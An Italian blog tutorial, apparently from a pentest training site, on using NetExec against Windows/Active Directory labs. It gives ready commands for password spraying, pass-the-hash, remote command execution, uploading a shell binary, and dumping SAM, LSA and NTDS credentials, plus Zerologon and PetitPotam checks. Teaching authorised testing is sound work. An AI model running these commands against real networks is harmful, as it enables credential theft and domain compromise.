---
title: 'NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validare Credenziali in Lab '
slug: netexec
description: 'Guida operativa a NXC (NetExec) per fare enumerazione e validazione credenziali in lab AD/SMB (HTB/PG/VM). Focus offensivo ma controllato: comandi realistici, output atteso, errori comuni e contromisure. Perfetta per passare da “vedo una 445 aperta” a “capisco cosa posso fare con queste credenziali”.'
image: /Gemini_Generated_Image_jxrwbzjxrwbzjxrw.webp
draft: false
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netexec
  - nxc
featured: false
---

# NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validare Credenziali in Lab

![Image](https://miro.medium.com/1%2AOKGrLm45IyN6IOobMa408A.png)

NetExec (nxc) è l’evoluzione moderna di CrackMapExec.
È uno strumento di auditing e penetration testing interno progettato per:

* Enumerare reti Windows e domini Active Directory
* Validare credenziali su larga scala
* Identificare privilegi amministrativi locali
* Automatizzare movimento laterale
* Eseguire moduli di auditing e vulnerability check

Lavora principalmente su:

* SMB
* WinRM
* LDAP
* MSSQL
* RDP

È pensato per assessment interni e simulazioni realistiche in ambienti autorizzati.

***

# Installazione NetExec (nxc)

## Metodo consigliato (pipx)

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install netexec
```

Verifica:

```bash
nxc --help
```

***

# Sintassi base

```bash
nxc <protocollo> <target> -u <utente> -p <password>
```

Esempio reale:

```bash
nxc smb 10.10.10.10 -u john -p Password123
```

***

# Fase 1 – Enumerazione iniziale rete Windows

## Identificare host e dominio

```bash
nxc smb 10.10.10.0/24
```

Output mostra:

* OS
* Nome dominio
* SMB signing
* Versione SMB

Serve per capire:

* Se siamo in ambiente dominio
* Se è possibile relay
* Se ci sono host legacy

***

# Fase 2 – Validazione credenziali

```bash
nxc smb 10.10.10.0/24 -u john -p Password123
```

Output chiave:

* `SUCCESS`
* `FAIL`
* `(Pwn3d!)` → privilegi amministrativi locali

***

# Password Spraying

Test password contro lista utenti:

```bash
nxc smb 10.10.10.0/24 -u users.txt -p Summer2024
```

Lista password su utente:

```bash
nxc smb 10.10.10.0/24 -u administrator -p passwords.txt
```

Continuare dopo successo:

```bash
nxc smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success
```

***

# Autenticazione avanzata

## Null session

```bash
nxc smb 10.10.10.10 --null-session
```

## Pass-the-Hash

```bash
nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

## Kerberos

```bash
nxc smb 10.10.10.10 -u john --kerberos
```

Forzare autenticazione locale:

```bash
nxc smb 10.10.10.10 -u john -p Password123 --local-auth
```

***

# SMB Enumeration

## Share

```bash
nxc smb 10.10.10.10 -u john -p Password123 --shares
```

## Utenti dominio

```bash
nxc smb 10.10.10.10 -u john -p Password123 --users
```

## Gruppi

```bash
nxc smb 10.10.10.10 -u john -p Password123 --groups
```

## Computer

```bash
nxc smb 10.10.10.10 -u john -p Password123 --computers
```

## Logged-on users

```bash
nxc smb 10.10.10.10 -u john -p Password123 --loggedon-users
```

## Password policy

```bash
nxc smb 10.10.10.10 -u john -p Password123 --pass-pol
```

***

# RID Brute

```bash
nxc smb 10.10.10.10 -u john -p Password123 --rid-brute
```

**Se usi NetExec (NXC), sappi che è il successore diretto di CrackMapExec (CME).**\
Prima di NXC c'era CME - ora **NXC è la versione attiva, aggiornata e mantenuta**.

**COSA È CAMBIATO:**

* **Prima:** `crackmapexec` (CME) - abbandonato, buggato, fermo al 2021
* **Ora:** `netexec` (NXC) - sviluppato attivamente, fix critici, nuove feature

**COMANDI:**

```bash
# Vecchio (CME) - ORA DEPRECATO
crackmapexec smb 192.168.1.0/24

# Nuovo (NXC) - USA QUESTO
nxc smb 192.168.1.0/24
```

**📖 APPROFONDISCI:**

* **Per confrontare con il vecchio CME:** [https://hackita.it/articoli/crackmapexec](https://hackita.it/articoli/crackmapexec)

**NXC È CME, MA FUNZIONANTE.**

***

# LDAP Enumeration

## Utenti

```bash
nxc ldap 10.10.10.10 -u john -p Password123 --users
```

## Gruppi

```bash
nxc ldap 10.10.10.10 -u john -p Password123 --groups
```

## Admin count

```bash
nxc ldap 10.10.10.10 -u john -p Password123 --admin-count
```

## Oggetti delega

```bash
nxc ldap 10.10.10.10 -u john -p Password123 --trusted-for-delegation
```

***

# Command Execution

## SMB - CMD

```bash
nxc smb 10.10.10.20 -u administrator -p Password123 -x whoami
```

## SMB - PowerShell

```bash
nxc smb 10.10.10.20 -u administrator -p Password123 -X "Get-Process"
```

## WinRM - CMD

```bash
nxc winrm 10.10.10.20 -u john -p Password123 -x whoami
```

## WinRM - PowerShell

```bash
nxc winrm 10.10.10.20 -u john -p Password123 -X "ipconfig"
```

***

# MSSQL Enumeration

## Query SQL

```bash
nxc mssql 10.10.10.15 -u sa -p Password123 -q "SELECT name FROM master.dbo.sysdatabases"
```

## Esecuzione comando

```bash
nxc mssql 10.10.10.15 -u sa -p Password123 -x whoami
```

***

# File Operations

## Spider share

```bash
nxc smb 10.10.10.10 -u john -p Password123 --spider C$
```

## Download file

```bash
nxc smb 10.10.10.10 -u john -p Password123 --share C$ --get-file users.txt users.txt
```

## Upload file

```bash
nxc smb 10.10.10.10 -u john -p Password123 --share C$ --put-file shell.exe shell.exe
```

***

# Dump credenziali

## Dump SAM

```bash
nxc smb 10.10.10.20 -u administrator -p Password123 --sam
```

## Dump LSA

```bash
nxc smb 10.10.10.20 -u administrator -p Password123 --lsa
```

## Dump NTDS

```bash
nxc smb 10.10.10.10 -u administrator -p Password123 --ntds
```

***

# Moduli Vulnerabilità

## Zerologon

```bash
nxc smb 10.10.10.10 -u john -p Password123 -M zerologon
```

## PetitPotam

```bash
nxc smb 10.10.10.10 -u john -p Password123 -M petitpotam
```

## MS17-010

```bash
nxc smb 10.10.10.10 -u john -p Password123 -M ms17-010
```

***

# Output su file

```bash
nxc smb 10.10.10.0/24 -u john -p Password123 --output output.csv
```

***

# Tabella Operativa

| Obiettivo            | Comando                  | Risultato         |
| -------------------- | ------------------------ | ----------------- |
| Scan rete            | `smb 10.10.10.0/24`      | Identifica host   |
| Validare credenziali | `-u john -p Password123` | Accesso valido    |
| Verificare admin     | `(Pwn3d!)`               | Pivot possibile   |
| Dump credenziali     | `--sam`                  | Hash locali       |
| Lateral movement     | `-x whoami`              | Esecuzione remota |

***

# Checklist Operativa Finale

* Identificare subnet
* Validare credenziale iniziale
* Spray controllato
* Individuare admin locali
* Enumerare dominio
* Eseguire comando remoto
* Dump credenziali
* Documentare evidenze

***

# FAQ

### NetExec è diverso da CrackMapExec?

Sì, è la sua evoluzione moderna con miglioramenti di stabilità e manutenzione attiva.

### Supporta Kerberos?

Sì, inclusa autenticazione ticket-based.

### È rilevabile?

Sì. Genera log di autenticazione su sistemi Windows.

### È adatto per internal network audit?

Sì. È progettato proprio per auditing e assessment interni.

***

## HackITA — Supporta la Crescita della Formazione Offensiva

Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:

👉 [https://hackita.it/supporta](https://hackita.it/supporta)

Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.

***

## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?

Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:

👉 [https://hackita.it/servizi](https://hackita.it/servizi)

Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
